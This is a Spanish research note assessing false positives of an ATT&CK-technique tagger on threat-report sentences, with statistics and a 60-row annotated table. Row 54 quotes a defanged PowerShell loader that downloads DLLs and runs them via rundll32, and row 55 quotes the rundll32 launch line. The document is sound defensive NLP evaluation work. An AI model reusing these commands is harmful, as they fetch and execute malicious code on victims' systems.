# Revisión manual de falsos positivos de ML-2 (F4.3, paso 7)

**Qué se revisa.** Una muestra aleatoria fija (semilla 2026) de **60 de los 270 falsos positivos** del
sistema decidido (SecureBERT 2.0 ∪ diccionario, semilla 1) en la partición de prueba de AnnoCTR. Un
falso positivo es una técnica predicha para una frase que AnnoCTR no anota en ella.

**Quién.** Clasificación hecha por Claude Code el 2026-11-07, **pendiente de validación de Javier**.
Las frases completas están en `data/ml2/revision/fp-revisada.json` (fuera de git). Aquí solo se citan
fragmentos cortos.

**Clases.**
- **H, hueco de anotación:** la frase describe la técnica (o la nombra) y AnnoCTR no la anotó.
- **D, dudoso:** solo es correcta con el contexto del informe, o la técnica es vecina de la anotada.
- **E, error:** la frase no describe la técnica.

## Resultado

| Clase | Total | Modelo | Diccionario (o ambos) |
|---|---:|---:|---:|
| H | 25 (42 %, IC 95 % 30–54 %) | 16 | 9 |
| D | 10 (17 %) | 10 | 0 |
| E | 25 (42 %) | 18 | 7 |

- **La precisión medida está infraestimada.** Si los huecos de anotación contaran como aciertos, la
  precisión por frase del sistema pasaría de **0,61 a unos 0,77** (0,73–0,82). Contando también los
  dudosos, a unos 0,84. La exhaustividad no cambia: esta revisión no busca técnicas no anotadas que
  el sistema tampoco vea.
- **Huecos típicos:** filas de tablas ATT&CK y técnicas nombradas en listas (AnnoCTR no anota
  todas las menciones explícitas), descargas de herramientas, activación de macros por el usuario,
  órdenes de PowerShell y `rundll32` literales.
- **Errores típicos:**
  - *Del modelo:* confundir discusión general con comportamiento del adversario (DoH, recomendaciones
    de SPF/DKIM, «escrito en .NET»), técnicas vecinas (ofuscar/desofuscar, AES/cifrado para impacto,
    depurador/sandbox) y menciones de otros malware.
  - *Del diccionario:* nombres de subtécnica genéricos que sobrevivieron a la poda («Web Services»,
    «Exploits», «Cloud Services», «Proxy», «masquerading») y lenguajes citados como dato («Python»).
- **Implicación para la memoria:** se informa la precisión medida (0,61) como oficial y la corregida
  como estimación, con su intervalo. Es el mismo criterio que en la revisión de F3 (Anexo E).

## Muestra

| # | Predicha | Método | Oro | Fragmento | Clase | Motivo |
|---:|---|---|---|---|:---:|---|
| 1 | T1204 User Execution | modelo | ∅ | «Stage-1 document fetches a macro-based template document hosted on the…» | **H** | la usuaria activa las macros: ejecución por el usuario |
| 2 | T1566 Phishing | modelo | ∅ | «**Regions targeted and content of the decoy files**: Based on…» | **E** | regiones objetivo, no phishing |
| 3 | T1140 Deobfuscate/Decode Files or Information | modelo | T1027 | «These lists are obfuscated using an XOR-based algorithm with hardcoded…» | **E** | ofuscar no es desofuscar (el oro es T1027) |
| 4 | T1071 Application Layer Protocol | modelo | ∅ | «In a Memo from then-director Chris Krebs, the offers were…» | **E** | memo sobre DNS de agencias |
| 5 | T1021 Remote Services | diccionario | T1078 | «Used AWS keys to obtain further access to cloud services…» | **H** | claves robadas para entrar en servicios en la nube (T1021.007) |
| 6 | T1090 Proxy | diccionario | T1566 | «### Reverse Proxy Phish Kits…» | **E** | encabezado sobre phish kits de proxy inverso (sería T1557) |
| 7 | T1566 Phishing | modelo | T1204 | «Windows LNK (LNK) extensions are usually seen by users as…» | **E** | LNK sin vía de entrega |
| 8 | T1059 Command and Scripting Interpreter | modelo | ∅ | «According to our research, the site is likely a compromised…» | **E** | web shell es T1505.003 |
| 9 | T1566 Phishing | modelo | T1059, T1204 | «The second variant of this attack, which we observed in…» | **D** | macro en documento: phishing solo por contexto |
| 10 | T1071 Application Layer Protocol | modelo | ∅ | «Note that this request does not contain a User-Agent field…» | **D** | petición HTTP sin User-Agent: C2 por contexto |
| 11 | T1566 Phishing | modelo | ∅ | «Look into SPF/DKIM/DMARC for your email services and link shims…» | **E** | recomendación SPF/DKIM |
| 12 | T1189 Drive-by Compromise | diccionario | ∅ | «T1189 Drive-by Compromise…» | **H** | fila de tabla ATT&CK explícita, sin anotar |
| 13 | T1105 Ingress Tool Transfer | modelo | T1140 | «This file is packed and decrypted in memory to produce…» | **H** | el stager descarga la baliza |
| 14 | T1059 Command and Scripting Interpreter | diccionario | T1566 | «Trickbot gains intrusion using spam emails bundled with malicious javascript…» | **H** | adjunto JavaScript (T1059.007) |
| 15 | T1071 Application Layer Protocol | modelo | ∅ | «An example HTTP POST request is shown below:…» | **D** | ejemplo de POST HTTP: C2 por contexto |
| 16 | T1071 Application Layer Protocol | modelo | ∅ | «With the introduction of DoH by Internet browsers and operating…» | **E** | DoH en general |
| 17 | T1027 Obfuscated Files or Information | modelo | ∅ | «Below is the snapshot of the first obfuscated layer:…» | **H** | capa ofuscada |
| 18 | T1105 Ingress Tool Transfer | modelo | ∅ | «The next wrong command is “do**nw**load\_file”, although in this case…» | **H** | orden download_file |
| 19 | T1566 Phishing | modelo | ∅ | «*Figure 1: Spoofed login page for the University of Central…» | **D** | página de login falsa: phishing por contexto |
| 20 | T1583 Acquire Infrastructure | diccionario | ∅ | «T1567 Exfiltration over Web Services…» | **E** | «Web Services» de T1567 confundido con T1583.006 |
| 21 | T1573 Encrypted Channel | modelo | ∅ | «DoH provides the benefit of communicating DNS information over a…» | **E** | descripción de DoH |
| 22 | T1125 Video Capture | modelo | T1056, T1113, T1115 | «As the name suggests, its primary purpose is logging keystrokes,…» | **H** | «viewing the webcam» |
| 23 | T1190 Exploit Public-Facing Application | modelo | T1021 | «These actors have obtained these credentials by leveraging well-known vulnerabilities…» | **H** | explotación de VPN/Citrix expuestos |
| 24 | T1566 Phishing | modelo | ∅ | «The threat actor is purporting to be entities associated with…» | **H** | correos con señuelo |
| 25 | T1497 Virtualization/Sandbox Evasion | modelo | ∅ | «To further hinder the dynamic analysis using debugger, the binary…» | **E** | detectar depurador es T1622 |
| 26 | T1059 Command and Scripting Interpreter | modelo | ∅ | «Finally, thanks to all the strings in the binary, it…» | **D** | webshell con órdenes: intérprete discutible |
| 27 | T1071 Application Layer Protocol | modelo | ∅ | «The old Emotet also used a multilayer communication protocol for…» | **D** | protocolo multicapa: ¿T1071 o T1095? |
| 28 | T1059 Command and Scripting Interpreter | modelo | T1056 | «Agent Tesla is a readily available keylogger and Remote Access…» | **E** | escrito en .NET |
| 29 | T1071 Application Layer Protocol | modelo | ∅ | «How DNS-over-HTTPS (DoH) has Changed the Threat Landscape For Companies…» | **E** | titular sobre DoH |
| 30 | T1140 Deobfuscate/Decode Files or Information | modelo | ∅ | «The first thing we observe within the process is how…» | **H** | descifrado y carga del payload |
| 31 | T1105 Ingress Tool Transfer | modelo | T1059 | «Figure 5: Disk artifacts after the pin.vbs file has been…» | **H** | el VBS descarga la DLL |
| 32 | T1204 User Execution | modelo | T1059 | «Once macros are enabled by the user, the VBA macro…» | **H** | macros activadas por el usuario |
| 33 | T1027 Obfuscated Files or Information | modelo | T1132 | «The path of the HTTP POST request consists of a…» | **D** | Base64+XOR: el oro dice T1132, T1027 vecino |
| 34 | T1486 Data Encrypted for Impact | modelo | ∅ | «Proofpoint identified TinyNuke infrastructure used in campaigns in 2018 overlapped…» | **E** | cita de otro ransomware |
| 35 | T1573 Encrypted Channel | modelo | T1486 | «Then, it encrypts it with 14 rounds of AES encryption.…» | **E** | AES del ransomware (oro T1486) |
| 36 | T1105 Ingress Tool Transfer | modelo | ∅ | «**id3** does not run anything, probably the author who is…» | **D** | script en Pastebin: ¿T1105 o T1102? |
| 37 | T1566 Phishing | modelo | ∅ | «While Intel 471 Malware Intelligence systems were unable to collect…» | **H** | malspam de Emotet |
| 38 | T1566 Phishing | modelo | ∅ | «The image depicts an Emotet document lure.…» | **H** | documento señuelo de Emotet |
| 39 | T1113 Screen Capture | ambos | ∅ | «[T1113: Screen Capture](https://attack.mitre.org/techniques/T1113)…» | **H** | enlace explícito a T1113 |
| 40 | T1059 Command and Scripting Interpreter | diccionario | T1055 | «The infection chain continues executing both the decoy PDF document…» | **E** | «Python» como lenguaje del RAT |
| 41 | T1090 Proxy | diccionario | T1555, T1566 | «* Threat actors are using phish kits that leverage transparent…» | **E** | proxy inverso de AiTM (T1557) |
| 42 | T1112 Modify Registry | modelo | T1547 | «**Persistance** [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys…» | **D** | Run keys implica registro, ATT&CK lo separa |
| 43 | T1071 Application Layer Protocol | modelo | ∅ | «DNS-over-HTTPS (DoH) protocol is now offered and in some instances…» | **E** | DoH en navegadores |
| 44 | T1566 Phishing | modelo | ∅ | «The attachments lead to a university themed email credential theft…» | **H** | adjuntos que llevan a robo de credenciales |
| 45 | T1204 User Execution | modelo | T1059 | «This document is using a DocuSign template lure that instructs…» | **H** | se pide al usuario activar la macro |
| 46 | T1071 Application Layer Protocol | modelo | T1132 | «The path of the HTTP POST request consists of a…» | **H** | C2 por HTTP POST (T1071.001) |
| 47 | T1588 Obtain Capabilities | diccionario | T1110 | «Brute forcing RDP accounts, the dumping of credentials, and the…» | **E** | usar exploits no es obtenerlos (T1588.005) |
| 48 | T1071 Application Layer Protocol | modelo | ∅ | «The template used to generate the HTTP requests is shown…» | **D** | plantilla de peticiones HTTP |
| 49 | T1027 Obfuscated Files or Information | modelo | T1486 | «Since Babuk decided not to use any packing mechanism, we…» | **E** | ausencia de empaquetado |
| 50 | T1021 Remote Services | diccionario | ∅ | «ShinyHunters tries to obtain legitimate credentials, most likely for a…» | **E** | obtener credenciales de la nube no es usarlas |
| 51 | T1140 Deobfuscate/Decode Files or Information | modelo | T1486 | «After the successful execution, we get the two eliptic curve…» | **E** | generación de claves |
| 52 | T1027 Obfuscated Files or Information | modelo | T1059 | «In this case, the Javascript [***5B606A5495A55F2BD8559778A620F21B***] file has three layers…» | **H** | tres capas de ofuscación |
| 53 | T1090 Proxy | diccionario | T1071 | «In the case of the samples analyzed, instead of using…» | **H** | endpoint que hace de proxy |
| 54 | T1059 Command and Scripting Interpreter | ambos | ∅ | «powershell $dfkj="$strs=\"".Split(\",\");foreach($st in $strs){$r1=Get-Random;$r2=Get-Random;$tpth=\"c:\programdata\\\"+$r1+\"[.]dll\";Invoke-WebRequest -Uri $st -OutFile $tpth;if(Test-Path $tpth){$fp=\"c:\windows\syswow64\rundll32[.]exe\";$a=$tpth+\",f\"+$r2;Start-Process $fp…» | **H** | orden PowerShell literal |
| 55 | T1218 System Binary Proxy Execution | diccionario | ∅ | «"C:\windows\syswow64\rundll32[.]exe" c:\programdata\219183368[.]dll,f920683129…» | **H** | rundll32 ejecutando una DLL (T1218.011) |
| 56 | T1036 Masquerading | diccionario | ∅ | «If a user is in Germany, they will be directed…» | **E** | «masquerading» en sentido coloquial |
| 57 | T1486 Data Encrypted for Impact | diccionario | ∅ | «* T1486 Data Encrypted for Impact…» | **H** | técnica nombrada en una lista |
| 58 | T1059 Command and Scripting Interpreter | modelo | ∅ | «The analyzed *mscontainer.dll* sample, also developed in .NET, is composed…» | **E** | .NET |
| 59 | T1204 User Execution | diccionario | T1566 | «Once a victim clicks on the malicious link, they are…» | **H** | la víctima pulsa un enlace malicioso (T1204.001) |
| 60 | T1555 Credentials from Password Stores | modelo | T1078, T1539 | «Necrobrowser is a headless browser, which is a browser without…» | **E** | cookies de sesión robadas (T1550.004) |
